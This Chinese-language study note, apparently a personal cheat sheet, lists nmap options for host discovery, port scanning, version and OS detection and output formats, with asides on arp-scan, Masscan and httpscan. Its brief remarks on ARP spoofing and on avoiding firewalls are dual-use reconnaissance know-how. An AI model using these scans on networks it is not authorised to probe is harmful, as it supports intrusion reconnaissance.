# namp

# 目标说明

官方解释👇

ip/<numbit>: Nmap 将会扫描所有和该参考 IP 地址具有 <numbit > 相同比特的所有 IP 地址或主机.

例如，192.168.10.0/24 将会扫描 192.168.10.0 和 192.168.10.255 之间的 256 台主机。192.168.10.40/24 将会做同样的事情。

# 主机发现

选项 作用 说明
-iL <inputfilename> 从文件中输入 --excludefile <excludefile> 同理
--exclude <host1[，host2][，host3]，...> 排除主机 / 网络 以逗号分隔的列表排除它们
-sL 列表扫描 仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机
-sP Ping 扫描 进行 ping 扫描，打印出对扫描做出响应的主机
-P0 无 ping -Pn 常用
-n 不用域名解析 不对它发现的活动 IP 地址进行反向域名解析

# 端口扫描

nmap 把端口分成六个状态: open (开放的)， closed (关闭的)，filtered (被过滤的)， unfiltered (未被过滤的)， open|filtered (开放或者被过滤的)，或者 closed|filtered (关闭或者被过滤的)

选项 作用 说明
-sS TCP SYN 扫描 常用、快速执行、不打开一个完全的 TCP 链接
-sT TCP connect () 扫描
-sU UDP 扫描 UDP 扫描一般较慢，可以使用 --host-timeout 跳过慢速的主机
-p <port ranges> 只扫描指定的端口或端口范围 -p - 从端口 1 扫描到 65535
-sV 版本探测 也可以 - A 同时启用操作系统检测和版本检测

# -A 选项的使用

选项 作用
-A + -sV 启用版本检测，用于识别目标主机上运行的服务及其版本信息
-A + -O 启用操作系统检测，尝试识别目标主机的操作系统类型和版本
-A + -T4 设置扫描的速度级别为快速（4），加快扫描速度但可能导致被检测到
-A 执行高级扫描和识别

# 输出格式

选项 作用 说明
-oN <filespec> 标准输出 直接写入指定的文件
-oG <filespec> Grep 输出

# 题外话 1：arp-scan

什么是 ARP
地址解析协议（Address Resolution Protocol），其基本功能为通过目标设备的 IP 地址，查询目标设备的 MAC 地址，以保证通信的顺利进行。 它是 IPv4 中网络层必不可少的协议，是根据 IP 地址获得物理地址 MAC 的一个 TCP/IP 协议。通过 ARP，在局域网可以很容易构成一个 ARP 欺骗，从而得到有用数据信息。

参数 作业
-v 显示详细的进度消息
-V 显示版本
-i 使用网络接口
-f 从文件中读取主机名或地址
-I 从接口地址和网络掩码（包括网络和广播）生成列表

常用

arp-scan - 参考手册、选项、命令示例 (linuxos.info)

# 题外话 2：Masscan

Masscan 是一款快速、高性能的开源端口扫描工具，旨在以极高的速度扫描整个互联网的 IPv4 地址空间。它的设计目标是快速、灵活且适用于大规模的端口扫描任务。

其他参数详解：

选项 作用
--excludefile filename 排除文件中的选项
-oX filename 输出到 filename 的 XML
-oG filename 输出到 filename 在的 grepable 格式
-oJ filename 输出到 filename 在 JSON 格式。

项目地址

httpscan 是一个扫描指定 CIDR 网段的 Web 主机的小工具。和端口扫描器不一样，httpscan 是以爬虫的方式进行 Web 主机发现，因此相对来说不容易被防火墙拦截。
